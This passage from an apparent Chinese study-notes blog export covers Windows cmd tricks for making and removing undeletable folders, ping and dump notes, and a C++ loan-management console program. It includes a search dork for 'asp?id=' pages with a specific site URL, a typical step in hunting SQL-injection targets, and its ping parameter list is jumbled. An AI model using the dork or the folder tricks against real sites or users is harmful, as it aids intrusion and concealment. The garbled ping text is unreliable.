注意加空格和引号。这种方法建立的文件夹可见，可打开，可在该文件夹下创建、拷贝、删除文件，但不可删除。典型特征是文件夹末尾有空格。</p><p>3、md c:\test…\ 这是最常见的。这种方法建立的文件夹可见，不可打开，不可删除，典型特征是文件夹尾部有“.”。</p><p>4、md \.\c:\con\ 这种方法是强行建立一个与设备名相同的文件，造成无法删除，根据系统实际情况，也可能根本无法访问。因为文件夹名必须与设备名相同，所以这种方法典型的特征是文件夹名是固定的以下之一：con、aux、com1、com2、prn、nul。</p><p>5、超长文件名。一些文件名过长的文件夹进行嵌套，导致内层文件夹因路径名过程无法访问。比如C:\111…1\111…11\111….1\2\ 这时候最里边的2文件夹就没办法访问了</p><p>注意上边所提到的无法访问、无法删除都是指Windows自带的资源管理器，用cmd命令完全可以操作这些文件夹，否则有什么意义？用Windows自带管理器操作这些文件时，往往会看到错误提示：目标不存在、系统找不到该项目、路径错误、参数错误、MS-DOS功能无效等等类似的提示。</p><hr><p>​    接下来就讲解如何操作这些文件夹。</p><ul><li><p>对于第一种，这种方法基本已经失效，因为它只在win98上有效，估计现在没有用win98了，所以跳过。</p></li><li><p>对于第二种和第三种，这两种方法可以用一个杀手锏必杀。就是利用别名，我们不用考虑这个文件夹到底是怎么个结构，也不用考虑到底是怎么建成的，只要看一下它的别名就可以自由操作了。看别名的方法是用dir命令+/x参数。比如 dir c:\ /x 这个命令就是查看c盘下的所有文件，并显示别名。我们利用别名就可以随意操作这个文件了，比如：进入cd c:\AB259<del>1\ 删除rd c:\AB259</del>1\。</p></li><li><p>对于第四种，这种方法创建的非法文件比较特殊，能不能用Windows自带管理器访问要看系统具体情况，而且没有别名，那怎么办呢？我们来回忆一下它的原理：利用网络位置建立一个与设备名相同的非法文件。这句话说明之所以自带管理器无法操作是因为它在网络位置，那么我们在访问的时候加上网络位置就可以了！网络位置即在路径前加\.\。比如：进入 cd\.\c:\con\ 删除 rd\.\c:\con\。 这种文件夹一共就那么几种，应该很好识别！</p></li><li><p>对于第五种，这种方法很好破解，不就是因为路径长而无法访问吗？那我们就从最外层入手，先把最外层的文件夹名字改成短的，逐层深入，慢慢这个体系就瓦解了。为什么不从里边入手，因为里边路径太长，Windows系统不允许访问，更不允许重命名。如果这些超长文件夹被做了手脚（与上边的漏洞融合），导致无法重命名，那么。。。就要请出我们的cmd杀手锏了：别名！这些超长文件夹绝对是有别名的！从另一个角度看，访问这些超长文件夹也可以用8.3命名法，也就是用短文件名访问。所谓8.3命名法就是文件名不超过8个，扩展名不超过3个，比如123456789.txt写成123456~1.txt。</p></li></ul><hr><h3 id="ping命令学习笔记"><a href="#ping命令学习笔记" class="headerlink" title="ping命令学习笔记"></a>ping命令学习笔记</h3><p>ICMP的典型应用，常用来检测网络连通，搜集信息</p><p>参数</p><p>-a 设置发送ICMP ECHO Request报文的源IP地址。<br>-C 设置发送ICMP ECHO Request报文的取值范围1 <del>4294967295.缺省次数。为5次。<br>-h 设置TTL的值。取值范围1</del>255 .<br>-t 发送ICMP ECHO Request报文后,等|单位是ms ,取值范围是0 <del>待ICMP ECHO Reply报文的超时是65535.缺省超时时间是2000ms.<br>-m 设置发送下一个ICMP请求报文的等待取值范围1 ~ 10000 ,单位ms.<br>时间。缺省值为500ms.记录路由。缺省情况下,不记录路由。<br>-S ECHO-REQUEST报文长度(不包括IP单位是字节,取值范围是20</del>和ICMP报文头)。.8100.缺省报文长度是56字节。</p><hr><h3 id="关于dump"><a href="#关于dump" class="headerlink" title="关于dump"></a>关于dump</h3><p><strong>1、为什么要dump（dump的目的）？</strong>因为程序在计算机中运行时，在内存、CPU、I/O等设备上的数据都是动态的（或者说是易失的），也就是说数据使用完或者发生异常就会丢掉。如果我想得到某些时刻的数据（有可能是调试程序Bug或者收集某些信息），就要把他转储（dump）为静态（如文件）的形式。否则，这些数据你永远都拿不到。</p><p><strong>2、dump转储的是什么内容（dump的对象）？</strong>其实就是将动态（易失）的数据，保存为静态的数据（持久数据）。像程序这种本来就保存在存储介质（如硬盘）中的数据，也就没有必要dump。</p><p>常出现dump的场景：Unix/Linux中的coredump，Java中的headdump和threaddump，还有就是tcpdump工具</p><hr><p>inurl:asp?id= 教育</p><p><a href="http://www.tt120.org/article.asp?id=261">www.tt120.org/article.asp?id=261</a> </p><p>enterdesk.com 爬虫图片</p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cmd </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>不想写这烂大街的C++银行还贷系统</title>
      <link href="2023/03/30/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%B8%8D%E6%83%B3%E5%86%99%E8%BF%99%E7%83%82%E5%A4%A7%E8%A1%97%E7%9A%84C++%E9%93%B6%E8%A1%8C%E8%BF%98%E8%B4%B7%E7%B3%BB%E7%BB%9F/"/>
      <url>2023/03/30/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%B8%8D%E6%83%B3%E5%86%99%E8%BF%99%E7%83%82%E5%A4%A7%E8%A1%97%E7%9A%84C++%E9%93%B6%E8%A1%8C%E8%BF%98%E8%B4%B7%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<p>控制台界面</p><p>get：结构体嵌套写法  面向对象思想的应用   fstream库运用  while(1)break</p><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SUM 100</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">//一个贷款对应多个还贷信息，即时嵌套结构 </span></span><br><span class="line"><span class="comment">//还贷结构体 </span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">string id;<span class="comment">//还款编号</span></span><br><span class="line">string card;<span class="comment">//还款身份证号码</span></span><br><span class="line">string name;<span class="comment">//还款姓名</span></span><br><span class="line"><span class="keyword">double</span> price;<span class="comment">//还款金额</span></span><br><span class="line">string did;<span class="comment">//索还的贷款编号 </span></span><br><span class="line">&#125;HDai;</span><br><span class="line"><span class="comment">//贷款结构体 </span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">string id;<span class="comment">//贷款编号</span></span><br><span class="line">string card;<span class="comment">//身份证号码</span></span><br><span class="line">string name;<span class="comment">//贷款姓名</span></span><br><span class="line"><span class="keyword">double</span> price;<span class="comment">//贷款金额</span></span><br><span class="line"><span class="keyword">int</span> year;<span class="comment">//贷款年限</span></span><br><span class="line"><span class="keyword">int</span> n;<span class="comment">//还贷信息的个数 </span></span><br><span class="line">HDai h[SUM];<span class="comment">//还贷结构体信息 </span></span><br><span class="line">&#125;Dai;</span><br><span class="line"><span class="comment">//贷款结构体数组 </span></span><br><span class="line">Dai s[SUM];</span><br><span class="line"><span class="keyword">int</span> i, j;<span class="comment">//for循环变量</span></span><br><span class="line"><span class="keyword">int</span> n;<span class="comment">//贷款数组下标 </span></span><br><span class="line"><span class="comment">//水平线 </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hr</span><span class="params">()</span> </span>&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;--------------------------------------------------------------------------------------------------------\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 菜单 </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">menu</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;color 3E&quot;</span>);<span class="comment">//黑框界面颜色 </span></span><br><span class="line">cout &lt;&lt; <span class="string">&quot;**************************欢迎进入系统**************************&quot;</span> &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;\t1.申请贷款&quot;</span> &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;\t2.还贷&quot;</span> &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;\t3.查询贷款记录&quot;</span> &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;\t4.查询还贷记录&quot;</span> &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;\t5.退出程序&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//写入文件函数 </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getfile</span><span class="params">()</span> </span>&#123;</span><br><span class="line">fstream datafile;</span><br><span class="line">string str;<span class="comment">//临时字符串 </span></span><br><span class="line">string filename = <span class="string">&quot;data.txt&quot;</span>;</span><br><span class="line">datafile.<span class="built_in">open</span>(filename.<span class="built_in">c_str</span>(), fstream::in);</span><br><span class="line"><span class="keyword">if</span> (datafile.<span class="built_in">is_open</span>() == <span class="literal">false</span>) &#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;找不到data.txt文件&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">//打开文件后的处理操作</span></span><br><span class="line"><span class="keyword">while</span> (datafile &gt;&gt; str) &#123;</span><br><span class="line"><span class="comment">//根据i来对应读入str </span></span><br><span class="line"><span class="keyword">if</span> (i == <span class="number">6</span>) &#123;</span><br><span class="line">i = <span class="number">0</span>;</span><br><span class="line">n++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (i == <span class="number">0</span>)</span><br><span class="line">s[n].id = str;</span><br><span class="line"><span class="keyword">if</span> (i == <span class="number">1</span>)</span><br><span class="line">s[n].card = str;</span><br><span class="line"><span class="keyword">if</span> (i == <span class="number">2</span>)</span><br><span class="line">s[n].name = str;</span><br><span class="line"><span class="keyword">if</span> (i == <span class="number">3</span>)</span><br><span class="line">s[n].price = <span class="built_in">atof</span>(str.<span class="built_in">c_str</span>());</span><br><span class="line"><span class="keyword">if</span> (i == <span class="number">4</span>)</span><br><span class="line">s[n].year = <span class="built_in">atoi</span>(str.<span class="built_in">c_str</span>());</span><br><span class="line"><span class="keyword">if</span> (i == <span class="number">5</span>) &#123;</span><br><span class="line">s[n].n = <span class="built_in">atoi</span>(str.<span class="built_in">c_str</span>());</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; s[n].n; j++) &#123;</span><br><span class="line">datafile &gt;&gt; s[n].h[j].id &gt;&gt; s[n].h[j].card &gt;&gt; s[n].h[j].name &gt;&gt; s[n].h[j].price &gt;&gt; s[n].h[j].did;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">i++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">n++;</span><br><span class="line"><span class="comment">//最后关闭文件流</span></span><br><span class="line"><span class="comment">//cout&lt;&lt;&quot;信息录入成功！&quot;&lt;&lt;endl;</span></span><br><span class="line">datafile.<span class="built_in">close</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//申请贷款函数 </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">task1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;请输入贷款编号&quot;</span> &lt;&lt; endl;</span><br><span class="line">string id;</span><br><span class="line"><span class="keyword">bool</span> bl = <span class="literal">false</span>;</span><br><span class="line">cin &gt;&gt; id;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (s[i].id == id) &#123;</span><br><span class="line">bl = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (bl) &#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;对不起，贷款编号重复了！&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">s[n].id = id;<span class="comment">//记录下贷款编号 </span></span><br><span class="line">cout &lt;&lt; <span class="string">&quot;请输入贷款人身份证号码&quot;</span> &lt;&lt; endl;</span><br><span class="line">cin &gt;&gt; s[n].card;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;请输入贷款人的姓名&quot;</span> &lt;&lt; endl;</span><br><span class="line">cin &gt;&gt; s[n].name;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;请输入贷款的金额&quot;</span> &lt;&lt; endl;</span><br><span class="line">cin &gt;&gt; s[n].price;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;请输入贷款的年限&quot;</span> &lt;&lt; endl;</span><br><span class="line">cin &gt;&gt; s[n].year;</span><br><span class="line"><span class="comment">//刚贷款还未有还贷</span></span><br><span class="line">s[n].n = <span class="number">0</span>;</span><br><span class="line">n++;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;贷款成功&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//还贷函数 </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">task2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;请输入要还贷的贷款编号&quot;</span> &lt;&lt; endl;</span><br><span class="line">string id;</span><br><span class="line"><span class="keyword">bool</span> bl = <span class="literal">false</span>;</span><br><span class="line">cin &gt;&gt; id;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (s[i].id == id) &#123;</span><br><span class="line">bl = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (bl) &#123;</span><br><span class="line"><span class="keyword">bool</span> bbl = <span class="literal">false</span>;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;请输入还贷编号&quot;</span> &lt;&lt; endl;</span><br><span class="line"><span class="comment">//判断还贷编号不能一样</span></span><br><span class="line">cin &gt;&gt; id;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; s[i].n; j++) &#123;</span><br><span class="line"><span class="keyword">if</span> (s[i].h[j].id == id) &#123;</span><br><span class="line">bbl = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (bbl) &#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;对不起，还贷编号不能重复&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">//开始进行还贷 </span></span><br><span class="line"><span class="comment">//记录下还贷编号</span></span><br><span class="line">s[i].h[s[i].n].id = id;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;请输入还贷人身份证号码&quot;</span> &lt;&lt; endl;</span><br><span class="line">cin &gt;&gt; s[i].h[s[i].n].card;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;请输入还贷人的姓名&quot;</span> &lt;&lt; endl;</span><br><span class="line">cin &gt;&gt; s[i].h[s[i].n].name;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;请输入还贷的金额&quot;</span> &lt;&lt; endl;</span><br><span class="line">cin &gt;&gt; s[i].h[s[i].n].price;</span><br><span class="line">s[i].h[s[i].n].did = s[i].id;</span><br><span class="line"><span class="comment">//还贷成功++ </span></span><br><span class="line">s[i].n++;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;还贷成功&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;对不起，未找到该贷款编号&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//查询贷款记录函数 </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">task3</span><span class="params">()</span> </span>&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;请输入贷款人的身份证号码&quot;</span> &lt;&lt; endl;</span><br><span class="line">string card;</span><br><span class="line">cin &gt;&gt; card;</span><br><span class="line"><span class="keyword">bool</span> bl = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (s[i].card == card) &#123;</span><br><span class="line">bl = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (bl) &#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;查询成功&quot;</span> &lt;&lt; endl;</span><br><span class="line"><span class="built_in">hr</span>();</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (s[i].card == card) &#123;</span><br><span class="line"><span class="built_in">hr</span>();</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;贷款编号：&quot;</span> &lt;&lt; s[i].id &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;贷款人身份证：&quot;</span> &lt;&lt; s[i].card &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;贷款人姓名：&quot;</span> &lt;&lt; s[i].name &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;贷款人金额：&quot;</span> &lt;&lt; s[i].price &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;贷款人年限：&quot;</span> &lt;&lt; s[i].year &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;该贷款人还没有贷款信息&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//查询还贷记录函数 </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">task4</span><span class="params">()</span> </span>&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;请输入一个贷款编号&quot;</span> &lt;&lt; endl;</span><br><span class="line">string id;</span><br><span class="line"><span class="keyword">bool</span> bl = <span class="literal">false</span>;</span><br><span class="line">cin &gt;&gt; id;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (s[i].id == id) &#123;</span><br><span class="line">bl = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (bl) &#123;</span><br><span class="line"><span class="built_in">hr</span>();</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;查询成功,该贷款编号的还贷信息如下：&quot;</span> &lt;&lt; endl;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; s[i].n; j++) &#123;</span><br><span class="line"><span class="built_in">hr</span>();</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;还款编号：&quot;</span> &lt;&lt; s[i].h[j].id &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;还款人身份证：&quot;</span> &lt;&lt; s[i].h[j].card &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;还款人姓名：&quot;</span> &lt;&lt; s[i].h[j].name &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;还款金额：&quot;</span> &lt;&lt; s[i].h[j].price &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;还款的贷款编号：&quot;</span> &lt;&lt; s[i].h[j].did &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;对不起，未找到这个贷款编号&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//查看这个贷款编号是否存在，并 </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//写入文件函数 </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">inputfile</span><span class="params">()</span> </span>&#123;</span><br><span class="line">fstream datafile;<span class="comment">//文件字符流 </span></span><br><span class="line">string str;<span class="comment">//临时字符串 </span></span><br><span class="line">string filename = <span class="string">&quot;data.txt&quot;</span>;</span><br><span class="line">datafile.<span class="built_in">open</span>(filename.<span class="built_in">c_str</span>(), fstream::out); <span class="comment">//打开文件 </span></span><br><span class="line"><span class="comment">//判断文件是否存在 </span></span><br><span class="line"><span class="keyword">if</span> (datafile.<span class="built_in">is_open</span>() == <span class="literal">false</span>) &#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;找不到data.txt文件&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">//打开文件后的处理操作</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">datafile &lt;&lt; s[i].id &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; s[i].card &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; s[i].name &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; s[i].price &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; s[i].year &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; s[i].n &lt;&lt; endl;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; s[i].n; j++) &#123;</span><br><span class="line">datafile &lt;&lt; s[i].h[j].id &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; s[i].h[j].card &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; s[i].h[j].name &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; s[i].h[j].price &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; s[i].h[j].did &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//最后关闭文件流</span></span><br><span class="line">cout 